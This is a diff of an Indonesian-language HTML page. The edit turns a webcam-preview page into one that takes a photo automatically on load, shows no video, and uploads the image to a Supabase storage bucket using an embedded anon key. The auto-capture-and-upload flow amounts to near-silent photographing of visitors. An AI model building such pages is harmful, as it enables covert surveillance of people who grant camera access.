@@ -3,56 +3,37 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simpan Foto ke Supabase</title>
+  <title>Simpan Foto Otomatis ke Supabase</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
-    video, canvas { width: 300px; border: 2px solid #333; margin: 10px 0; }
-    #status { margin-top: 10px; color: green; font-weight: bold; }
+    body { font-family: Arial, sans-serif; text-align: center; margin: 40px; }
+    #status { margin-top: 20px; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h2>Ambil Foto & Simpan ke Supabase</h2>
-  
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div id="status"></div>
+  <h2>Foto sedang diambil...</h2>
+  <div id="status">Mohon tunggu...</div>
 
   <!-- Supabase JS -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
     const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
     const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
-    const BUCKET = "foto-users"; // ganti dengan nama bucket kamu
+    const BUCKET = "foto-users"; // ganti sesuai nama bucket kamu
 
     const { createClient } = supabase;
     const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
     const statusEl = document.getElementById("status");
 
-    // Aktifkan kamera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+    // Ambil foto otomatis tanpa menampilkan video
+    async function ambilFoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
 
-        // Ketika video sudah siap, langsung ambil foto
-        video.onloadedmetadata = () => {
-          ambilFotoOtomatis();
-        };
-      })
-      .catch(err => {
-        alert("Tidak bisa mengakses kamera: " + err);
-      });
-
-    async function ambilFotoOtomatis() {
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(async (blob) => {
-        const fileName = `foto_${Date.now()}.png`;
+        const fileName = `foto_${Date.now()}.jpg`;
 
         // Upload ke Supabase Storage
         const { error } = await client.storage
@@ -60,7 +41,7 @@
           .upload(fileName, blob, {
             cacheControl: "3600",
             upsert: false,
-            contentType: "image/png"
+            contentType: "image/jpeg"
           });
 
         if (error) {
@@ -68,10 +49,20 @@
           statusEl.innerText = "Gagal upload: " + error.message;
         } else {
           statusEl.style.color = "green";
-          statusEl.innerText = "Foto berhasil disimpan!";
+          statusEl.innerText = "Foto berhasil disimpan ke Supabase!";
         }
-      }, "image/png");
+
+        // Hentikan kamera setelah ambil foto
+        track.stop();
+
+      } catch (err) {
+        statusEl.style.color = "red";
+        statusEl.innerText = "Tidak bisa ambil foto: " + err;
+      }
     }
+
+    // Jalan otomatis setelah izin kamera diberikan
+    ambilFoto();
   </script>
 </body>
 </html>
